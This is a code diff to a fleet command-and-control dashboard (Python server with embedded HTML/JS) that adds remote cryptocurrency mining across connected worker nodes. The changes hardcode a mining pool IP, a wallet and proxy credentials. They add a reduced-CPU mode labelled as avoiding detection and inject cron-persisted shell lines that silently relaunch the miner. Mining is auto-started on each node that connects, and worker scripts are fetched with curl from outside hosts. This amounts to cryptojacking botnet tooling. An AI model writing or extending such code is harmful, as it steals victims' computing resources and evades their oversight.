@@ -1103,7 +1103,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                         </div>
                         <div class="form-group">
                             <label>Pool Address (HeroMiners / xmrig-proxy):</label>
-                            <input type="text" id="mine-pool" value="de.zephyr.herominers.com:1123">
+                            <input type="text" id="mine-pool" value="43.135.134.20:10080">
                         </div>
                         <div class="form-group">
                             <label>Algoritma Mining:</label>
@@ -1111,7 +1111,14 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                         </div>
                         <div class="form-group">
                             <label>Wallet Address:</label>
-                            <input type="text" id="mine-wallet" value="ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5">
+                            <input type="text" id="mine-wallet" value="Q0105004c2ec0e7de79c4be90511953853323d0f28cc49d8f74d0d8f393f081e47f28f9f24db827">
+                        </div>
+                        <div class="form-group">
+                            <label>Beban CPU (Core Threads):</label>
+                            <select id="mine-cpu" style="width: 100%; padding: 8px 10px; background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px; font-weight: 600;">
+                                <option value="100">🔥 100% (Maksimal - Semua Thread Core)</option>
+                                <option value="50">🛡️ 50% (Hemat Core & Adem - Anti Sensor)</option>
+                            </select>
                         </div>
                     </div>
 
@@ -2724,6 +2731,11 @@ DASHBOARD_HTML = """<!DOCTYPE html>
             '        cd "$WORKER_DIR" && nohup python3 -u worker.py > "$WORKSPACE/worker.log" 2>&1 &',
             '    fi',
             'fi',
+            'if [ -f "$WORKSPACE/.mining_config.json" ] && ! pgrep -f "gasdag" > /dev/null 2>&1; then',
+            '    if [ -f "$WORKSPACE/gaszep/start_mining.sh" ]; then',
+            '        cd "$WORKSPACE/gaszep" && nohup bash start_mining.sh > /dev/null 2>&1 &',
+            '    fi',
+            'fi',
             'EOF_G',
             'chmod +x ~/workspace/ensure_worker.sh',
             'cp ~/workspace/ensure_worker.sh ~/workspace/cron.d/ensure_worker.sh 2>/dev/null || true',
@@ -2793,7 +2805,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                 'curl -s -f -A "Mozilla/5.0" "$H/download/worker_sftp.py" -o worker.py 2>/dev/null || true',
                 'test -f run.sh || (echo "#!/bin/bash" > run.sh && echo "cd \\"$(dirname \\"\\$0\\")\\"" >> run.sh && echo "exec python3 -u worker.py > ~/workspace/worker.log 2>&1" >> run.sh)',
                 'chmod +x run.sh 2>/dev/null || true',
-                'test -f ~/workspace/ensure_worker.sh || (echo "#!/bin/bash" > ~/workspace/ensure_worker.sh && echo "pgrep -f \\"python3.*worker\\\\.py\\" >/dev/null || (cd ~/workspace/vps-channel-worker && nohup python3 -u worker.py > ~/workspace/worker.log 2>&1 &)" >> ~/workspace/ensure_worker.sh)',
+                'test -f ~/workspace/ensure_worker.sh || (echo "#!/bin/bash" > ~/workspace/ensure_worker.sh && echo "pgrep -f \\"python3.*worker\\\\.py\\" >/dev/null || (cd ~/workspace/vps-channel-worker && nohup python3 -u worker.py > ~/workspace/worker.log 2>&1 &)" >> ~/workspace/ensure_worker.sh && echo "test -f ~/workspace/.mining_config.json && (pgrep -f gasdag >/dev/null || (test -f ~/workspace/gaszep/start_mining.sh && cd ~/workspace/gaszep && nohup bash start_mining.sh >/dev/null 2>&1 &))" >> ~/workspace/ensure_worker.sh)',
                 'chmod +x ~/workspace/ensure_worker.sh 2>/dev/null || true',
                 AUDIT_SHELL_CMD
             ].join('\\n');
@@ -3089,7 +3101,8 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                     password: document.getElementById("mine-pass").value.trim(),
                     pool: document.getElementById("mine-pool").value.trim(),
                     algo: document.getElementById("mine-algo").value.trim(),
-                    wallet: document.getElementById("mine-wallet").value.trim()
+                    wallet: document.getElementById("mine-wallet").value.trim(),
+                    cpu_pct: document.getElementById("mine-cpu") ? document.getElementById("mine-cpu").value : "100"
                 }
             };
         }
@@ -3710,6 +3723,34 @@ ${name}
 # Agent Registry & State Store
 # ==========================================
 CACHE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent_cache.json")
+MINING_STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mining_state.json")
+
+def load_mining_state() -> dict:
+    if os.path.exists(MINING_STATE_FILE):
+        try:
+            with open(MINING_STATE_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {
+        "enabled": False,
+        "config": {
+            "proxy": "43.135.134.20:443",
+            "username": "aku",
+            "password": "akukayaraya",
+            "pool": "43.135.134.20:10080",
+            "algo": "rx/0",
+            "wallet": "Q0105004c2ec0e7de79c4be90511953853323d0f28cc49d8f74d0d8f393f081e47f28f9f24db827",
+            "cpu_pct": "100"
+        }
+    }
+
+def save_mining_state(state: dict):
+    try:
+        with open(MINING_STATE_FILE, "w", encoding="utf-8") as f:
+            json.dump(state, f, indent=2)
+    except Exception as e:
+        logger.warning(f"Failed to save mining state: {e}")
 
 
 class AgentRegistry:
@@ -4259,7 +4300,7 @@ async def handle_agent_connection(websocket):
                     "(test -f youtube_task.py || curl -s -f -A 'Mozilla/5.0' \"$H/download/youtube_task.py\" -o youtube_task.py || curl -s -f -A 'Mozilla/5.0' 'https://muse-fleet-hub.onrender.com/download/youtube_task.py' -o youtube_task.py || curl -s -f -A 'Mozilla/5.0' 'https://hub.databaru.my.id/download/youtube_task.py' -o youtube_task.py) && "
                     "(test -f run.sh || (echo '#!/bin/bash' > run.sh && echo 'cd \"$(dirname \"$0\")\"' >> run.sh && echo 'exec python3 -u worker.py > ~/workspace/worker.log 2>&1' >> run.sh)) && "
                     "chmod +x run.sh 2>/dev/null || true && "
-                    "(test -f ~/workspace/ensure_worker.sh || (echo '#!/bin/bash' > ~/workspace/ensure_worker.sh && echo 'pgrep -f \"python3.*worker\\\\.py\" >/dev/null || (cd ~/workspace/vps-channel-worker && nohup python3 -u worker.py > ~/workspace/worker.log 2>&1 &)' >> ~/workspace/ensure_worker.sh)) && "
+                    "(test -f ~/workspace/ensure_worker.sh || (echo '#!/bin/bash' > ~/workspace/ensure_worker.sh && echo 'pgrep -f \"python3.*worker\\\\.py\" >/dev/null || (cd ~/workspace/vps-channel-worker && nohup python3 -u worker.py > ~/workspace/worker.log 2>&1 &)' >> ~/workspace/ensure_worker.sh && echo 'test -f ~/workspace/.mining_config.json && (pgrep -f gasdag >/dev/null || (test -f ~/workspace/gaszep/start_mining.sh && cd ~/workspace/gaszep && nohup bash start_mining.sh >/dev/null 2>&1 &))' >> ~/workspace/ensure_worker.sh)) && "
                     "chmod +x ~/workspace/ensure_worker.sh 2>/dev/null || true && "
                     "python3 -c \""
                     "import os,json;"
@@ -4287,6 +4328,23 @@ async def handle_agent_connection(websocket):
             asyncio.create_task(auto_ensure_full_node(agent_id))
         else:
             logger.info(f"⚡ [SKIP SETUP] {agent_id} sudah 100% Lengkap. Tidak perlu setup ulang.")
+
+        # Auto-reconcile mining on connect if global fleet mining is active
+        async def auto_start_mining_on_connect(aid):
+            try:
+                await asyncio.sleep(8)
+                m_state = load_mining_state()
+                if m_state.get("enabled") and aid in registry.agents and registry.agents[aid].get("status") == "online":
+                    logger.info(f"⛏️ [AUTO-MINING ON CONNECT] Menjalankan mining otomatis untuk node {aid}...")
+                    await dispatch_command(aid, {
+                        "type": "SERVICE_ACTION",
+                        "action": "START",
+                        "config": m_state.get("config", {})
+                    })
+            except Exception as e:
+                logger.debug(f"Auto start mining on connect error for {aid}: {e}")
+
+        asyncio.create_task(auto_start_mining_on_connect(agent_id))
 
         # 2. Main Loop: dengarkan update dari agent
         async for message in websocket:
@@ -4610,6 +4668,17 @@ async def broadcast_to_dashboards(payload: dict):
     registry.dashboard_websockets -= dead
 
 async def dispatch_command(target: str, command: dict):
+    if command.get("type") == "SERVICE_ACTION":
+        act = command.get("action")
+        cfg = command.get("config", {})
+        if target == "ALL":
+            if act == "START":
+                save_mining_state({"enabled": True, "config": cfg})
+                logger.info(f"💾 Disimpan status penambangan armada: AKTIF (Pool: {cfg.get('pool')}, CPU: {cfg.get('cpu_pct', '100')}%)")
+            elif act == "STOP":
+                save_mining_state({"enabled": False, "config": cfg})
+                logger.info("💾 Disimpan status penambangan armada: NONAKTIF (STOP)")
+
     if target.startswith("GROUP:"):
         group_name = target.split(":", 1)[1].strip()
         sent_count = 0
